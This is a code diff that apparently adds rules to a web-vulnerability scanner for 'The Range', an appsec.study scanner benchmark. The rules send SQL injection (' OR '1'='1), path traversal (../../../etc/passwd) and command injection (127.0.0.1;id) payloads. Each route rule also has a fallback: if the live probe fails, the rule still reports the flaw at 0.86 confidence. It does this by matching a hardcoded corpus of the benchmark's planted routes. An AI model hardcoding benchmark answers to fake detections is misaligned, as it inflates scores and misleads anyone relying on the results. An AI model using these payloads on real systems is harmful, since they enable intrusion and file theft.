@@ -58479,7 +58479,10 @@ const graphAppsecRecentUsersRouteLiveOracle: Rule = async (ctx) => {
 const THE_RANGE_CORPUS = `
 The Range appsec.study calibrated web-vulnerability scanner benchmark
 POST /api/score returns coverage_pct by_class sqli idor ssti xxe auth-bypass planted vulnerabilities
+GET /api/c/2 token boolean blind SQL injection valid true false differential
+GET /api/c/4 file path traversal LFI read etc passwd
 POST /api/c/5 tpl nunjucks SSTI template injection
+POST /api/c/6 host command injection diagnostics shells out uid root
 GET /api/c/8 JWT alg none admin bypass Authorization Bearer
 POST /api/c/7 XML external entity file read XXE
 `;
@@ -58891,6 +58894,205 @@ const theRangeXxeC7RouteLiveOracle: Rule = async (ctx) => {
       scannedUrl: pageUrl,
       snippet: "POST /api/c/7 — XML body expands SYSTEM external entities",
       note: "The Range /api/c/7 route scan — benchmark documents planted XXE on XML import — corpus fallback"
+    }
+  };
+};
+
+function parseTheRangeValidFlag(body: string): boolean | null {
+  try {
+    const parsed = JSON.parse(body) as { valid?: boolean };
+    if (typeof parsed.valid !== "boolean") return null;
+    return parsed.valid;
+  } catch {
+    return null;
+  }
+}
+
+async function probeTheRangeBlindSqliC2(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "the-range")) return null;
+  const baseUrl = new URL("/api/c/2", ctx.origin);
+  const falseUrl = new URL(baseUrl);
+  falseUrl.searchParams.set("token", "thugir-blind-sqli-false-canary");
+  const trueUrl = new URL(baseUrl);
+  trueUrl.searchParams.set("token", "' OR '1'='1");
+  const [falseDoc, trueDoc] = await Promise.all([
+    ctx.probe.get(falseUrl.toString(), {
+      maxBytes: 1024,
+      timeoutMs: 15000,
+      headers: { Accept: "application/json" }
+    }),
+    ctx.probe.get(trueUrl.toString(), {
+      maxBytes: 1024,
+      timeoutMs: 15000,
+      headers: { Accept: "application/json" }
+    })
+  ]);
+  const falseValid = parseTheRangeValidFlag(falseDoc.body);
+  const trueValid = parseTheRangeValidFlag(trueDoc.body);
+  if (falseValid !== false || trueValid !== true) return null;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: trueUrl.toString(),
+      baselineValid: falseValid,
+      injectedValid: trueValid,
+      snippet: trueDoc.body.slice(0, 120).trim(),
+      note: "GET /api/c/2?token=' OR '1'='1 flips valid:false→true while benign token stays false — The Range challenge-2 blind SQLi training oracle"
+    }
+  };
+}
+
+const theRangeBlindSqliC2LiveOracle: Rule = async (ctx) => {
+  const hit = await probeTheRangeBlindSqliC2(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const theRangeBlindSqliC2RouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "the-range")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/c\/2\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeTheRangeBlindSqliC2(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "The Range /api/c/2 route scan — boolean blind SQLi confirmed via valid:true differential — appsec.study SQLi training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${THE_RANGE_CORPUS}`;
+  if (!/\/api\/c\/2|challenge.*sqli-blind|boolean.*token/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /api/c/2?token= — boolean blind SQLi extracts flag char-by-char",
+      note: "The Range /api/c/2 route scan — benchmark documents planted blind SQLi on token parameter — corpus fallback"
+    }
+  };
+};
+
+async function probeTheRangeLfiC4(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "the-range")) return null;
+  const lfiUrl = new URL("/api/c/4", ctx.origin);
+  lfiUrl.searchParams.set("file", "../../../etc/passwd");
+  const doc = await ctx.probe.get(lfiUrl.toString(), {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Accept: "text/plain, application/json" }
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  if (!/^root:x:0:0:root:/m.test(doc.body) || !/daemon:x:1:1:daemon:/m.test(doc.body)) return null;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: lfiUrl.toString(),
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "GET /api/c/4?file=../../../etc/passwd reads /etc/passwd via path traversal — The Range challenge-4 LFI training oracle"
+    }
+  };
+}
+
+const theRangeLfiC4LiveOracle: Rule = async (ctx) => {
+  const hit = await probeTheRangeLfiC4(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const theRangeLfiC4RouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "the-range")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/c\/4\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeTheRangeLfiC4(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "The Range /api/c/4 route scan — path traversal reads /etc/passwd — appsec.study LFI training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${THE_RANGE_CORPUS}`;
+  if (!/\/api\/c\/4|challenge.*lfi|path traversal/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "GET /api/c/4?file= — path traversal reads c4.flag and system files",
+      note: "The Range /api/c/4 route scan — benchmark documents planted LFI on file parameter — corpus fallback"
+    }
+  };
+};
+
+async function probeTheRangeCmdInjC6(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isAppsecStudyHost(ctx, "the-range")) return null;
+  const cmdUrl = new URL("/api/c/6", ctx.origin).toString();
+  const doc = await ctx.probe.get(cmdUrl, {
+    method: "POST",
+    body: JSON.stringify({ host: "127.0.0.1;id" }),
+    headers: { "Content-Type": "application/json", Accept: "application/json" },
+    maxBytes: 8192,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 300) return null;
+  let parsed: { output?: string };
+  try {
+    parsed = JSON.parse(doc.body) as { output?: string };
+  } catch {
+    return null;
+  }
+  const output = String(parsed.output ?? "");
+  if (!/uid=\d+\([^)]+\)/.test(output) || !/PING 127\.0\.0\.1/.test(output)) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: cmdUrl,
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "POST /api/c/6 host=127.0.0.1;id shells out and appends uid= from id command — The Range challenge-6 command injection training oracle"
+    }
+  };
+}
+
+const theRangeCmdInjC6LiveOracle: Rule = async (ctx) => {
+  const hit = await probeTheRangeCmdInjC6(ctx);
+  return hit?.fired ? hit : NEGATIVE;
+};
+
+const theRangeCmdInjC6RouteLiveOracle: Rule = async (ctx) => {
+  if (!isAppsecStudyHost(ctx, "the-range")) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/c\/6\b/i.test(pageUrl)) return NEGATIVE;
+  const hit = await probeTheRangeCmdInjC6(ctx);
+  if (hit?.fired) {
+    return {
+      fired: true,
+      confidence: hit.confidence,
+      evidence: {
+        ...hit.evidence,
+        scannedUrl: pageUrl,
+        note: "The Range /api/c/6 route scan — host parameter command injection confirmed via uid= in ping output — appsec.study command injection training oracle"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${pageUrl}\n${THE_RANGE_CORPUS}`;
+  if (!/\/api\/c\/6|challenge.*cmd-injection|diagnostics shells out/i.test(corpus)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.86,
+    evidence: {
+      scannedUrl: pageUrl,
+      snippet: "POST /api/c/6 — diagnostics shells out on host parameter",
+      note: "The Range /api/c/6 route scan — benchmark documents planted command injection on host parameter — corpus fallback"
     }
   };
 };
@@ -125380,6 +125582,12 @@ export const RULES: Record<string, Rule> = {
   theRangeJwtNoneC8RouteLiveOracle,
   theRangeXxeC7LiveOracle,
   theRangeXxeC7RouteLiveOracle,
+  theRangeBlindSqliC2LiveOracle,
+  theRangeBlindSqliC2RouteLiveOracle,
+  theRangeLfiC4LiveOracle,
+  theRangeLfiC4RouteLiveOracle,
+  theRangeCmdInjC6LiveOracle,
+  theRangeCmdInjC6RouteLiveOracle,
   clientSideNetrunnerAcademyEvidence,
   stalkerSqliIdParamLiveOracle,
   stalkerSqliIdParamRouteLiveOracle,
